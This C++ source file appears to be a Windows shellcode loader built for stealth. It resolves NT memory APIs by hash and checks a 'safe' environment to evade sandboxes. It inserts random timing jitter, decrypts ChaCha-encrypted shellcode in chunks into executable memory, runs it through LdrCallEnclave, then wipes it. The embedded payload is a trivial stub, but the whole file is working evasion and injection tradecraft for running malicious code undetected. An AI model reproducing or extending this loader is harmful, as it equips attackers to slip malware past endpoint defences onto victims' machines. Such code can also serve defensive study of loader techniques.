#include "memory.h"
#include "stealth_loader.h"
#include "evasion.h"
#include "crypto.h"
#include "api_resolver.h"
#include <cstring>
#include <cstdio>

bool memok(unsigned char* addr, size_t size) {
    MEMORY_BASIC_INFORMATION meminfo;
    if (VirtualQuery(addr, &meminfo, sizeof(meminfo))) { 
        return (meminfo.State == MEM_COMMIT) &&
            (meminfo.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE)) &&
            !(meminfo.Protect & (PAGE_GUARD | PAGE_NOACCESS));
    }
    return false;
}   

void* findmem(size_t size) {
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);

    unsigned long long entropy = (GetCurrentProcessId() * GetTickCount()) ^ (unsigned long long)GetCurrentThreadId() ^ __rdtsc();
    unsigned char* current = (unsigned char*)sysinfo.lpMinimumApplicationAddress;
    current += (entropy * 0x1000) %
        (size_t)((unsigned long long)sysinfo.lpMaximumApplicationAddress - (unsigned long long)sysinfo.lpMinimumApplicationAddress);

    MEMORY_BASIC_INFORMATION meminfo;
    size_t queryresult;

    for (unsigned char* addr = current; addr < sysinfo.lpMaximumApplicationAddress; addr += meminfo.RegionSize) {
        if ((unsigned long long)addr % 0x2000 == 0) {
            waittime(1 + (__rdtsc() % 3), 0.1f);
        }

        queryresult = VirtualQuery(addr, &meminfo, sizeof(meminfo));
        if (queryresult == 0) break;

        if (meminfo.State == MEM_COMMIT &&
            (meminfo.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_READWRITE)) &&
            !(meminfo.Protect & (PAGE_GUARD | PAGE_NOACCESS)) &&
            meminfo.RegionSize >= size) {
            if (memok((unsigned char*)meminfo.BaseAddress, size)) {
                return meminfo.BaseAddress;
            }
        }
    }

    return NULL;
}

void* gettargetmod() {
    void* module = GetModuleHandleW(L"tprtdll.dll");
    if (module) return module;

    module = LoadLibraryExW(L"tprtdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_SEARCH_SYSTEM32);
    if (module) return module;

    return GetModuleHandleA("ntdll.dll");
}

void runpayload() {
    printf("execute_payload() called\n");
    
    if (!issafe()) {
        printf("execute_payload() - environment not safe, returning\n");
        return;
    }

    printf("execute_payload() - environment safe, proceeding\n");
    
    unsigned long long timer = __rdtsc();
    waittime(200 + (timer % 500), 0.4f);

    void* targetmod = gettargetmod();
    if (!targetmod) {
        targetmod = GetModuleHandleA("ntdll.dll");
    }
    printf("execute_payload() - target module: %p\n", targetmod);

    _allocmem allocmem =
        (_allocmem)findfunc(targetmod, hashstr("NtAllocateVirtualMemoryEx"));
    _protectmem protectmem =
        (_protectmem)findfunc(targetmod, hashstr("NtProtectVirtualMemory"));

    void* ntdllmod = GetModuleHandleA("ntdll.dll");
    _callfunc callfunc =
        (_callfunc)findfunc(ntdllmod, hashstr("LdrCallEnclave"));

    printf("execute_payload() - api resolution: allocate=%p, protect=%p, enclave=%p\n", 
           allocmem, protectmem, callfunc);

    if (!allocmem || !protectmem || !callfunc) {
        printf("execute_payload() - api resolution failed, returning\n");
        return;
    }

    unsigned char key[32];
    unsigned char nonce[12];
    if (!makechacha(key, sizeof(key), nonce, sizeof(nonce))) {
        printf("execute_payload() - key derivation failed, returning\n");
        return;
    }
    printf("execute_payload() - encryption key derived successfully\n");
    printf("execute_payload() - encryption key: ");
    for (size_t i = 0; i < sizeof(key); i++) {
        printf("%02x", key[i]);
    }
    printf("\n");
    
    printf("execute_payload() - encrypted shellcode size: %zu\n", shellsize);
    
    if (shellsize <= 1) {
        printf("execute_payload() - no shellcode to execute (size: %zu)\n", shellsize);
        return;
    }

    void* codeaddr = findmem(shellsize);
    int memallocated = 0;

    if (!codeaddr) {
        printf("execute_payload() - allocating new memory region\n");
        size_t allocsize = shellsize + (__rdtsc() % 0x800);
        long result = allocmem(
            GetCurrentProcess(),
            &codeaddr,
            &allocsize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
            NULL,
            0
        );

        if (result != 0) {
            printf("execute_payload() - memory allocation failed\n");
            return;
        }
        memallocated = 1;
    } else {
        printf("execute_payload() - found existing memory region at: %p\n", codeaddr);
    }

    printf("execute_payload() - shellcode copied to memory\n");
    for (size_t pos = 0; pos < shellsize; pos += 0x100) {
        size_t blocksize = (0x100 < shellsize - pos) ? 0x100 : shellsize - pos;
        memcpy((unsigned char*)codeaddr + pos, (unsigned char*)shellbytes + pos, blocksize);
        waittime(1 + (__rdtsc() % 2), 0.1f);
    }

    printf("execute_payload() - shellcode decrypted\n");
    size_t chunksize = 512 + (__rdtsc() % 512);
    for (size_t offset = 0; offset < shellsize; ) {
        size_t currentchunk = chunksize + (GetTickCount() % 256);
        if (offset + currentchunk > shellsize) {
            currentchunk = shellsize - offset;
        }

        chacha_crypt((unsigned char*)codeaddr + offset, currentchunk,
            key, sizeof(key), nonce);

        offset += currentchunk;
        waittime(1 + (__rdtsc() % 4), 0.2f);
    }

    if (memallocated) {
        size_t memsize = shellsize;
        unsigned long oldprotect;
        long status = protectmem(
            GetCurrentProcess(),
            &codeaddr,
            &memsize,
            PAGE_EXECUTE_READWRITE,
            &oldprotect
        );

        if (status == 0) {
            status = protectmem(
                GetCurrentProcess(),
                &codeaddr,
                &memsize,
                PAGE_EXECUTE_READ,
                &oldprotect
            );
        }

        if (status != 0) {
            printf("execute_payload() - memory protection failed\n");
            SecureZeroMemory(codeaddr, shellsize);
            VirtualFree(codeaddr, 0, MEM_RELEASE);
            return;
        }
    }

    FlushInstructionCache(GetCurrentProcess(), codeaddr, shellsize);

    void* param = NULL;

    if (callfunc) {
        printf("execute_payload() - executing via ldrcallenclave\n");
        waittime(50 + (__rdtsc() % 100), 0.1f);
        callfunc(codeaddr, 0, &param);
        printf("execute_payload() - enclave execution completed\n");
    }

    waittime(100 + (GetCurrentThreadId() % 200), 0.2f);

    if (memallocated) {
        size_t freesize = shellsize;
        unsigned long oldprotect;
        protectmem(
            GetCurrentProcess(),
            &codeaddr,
            &freesize,
            PAGE_READWRITE,
            &oldprotect
        );

        SecureZeroMemory(codeaddr, shellsize);
        VirtualFree(codeaddr, 0, MEM_RELEASE);
    }
    
    printf("execute_payload() completed successfully\n");
}

unsigned char shellbytes[] = { 
    0x48, 0x31, 0xc0,
    0x48, 0xff, 0xc0,
    0xc3
}; 
size_t shellsize = sizeof(shellbytes);
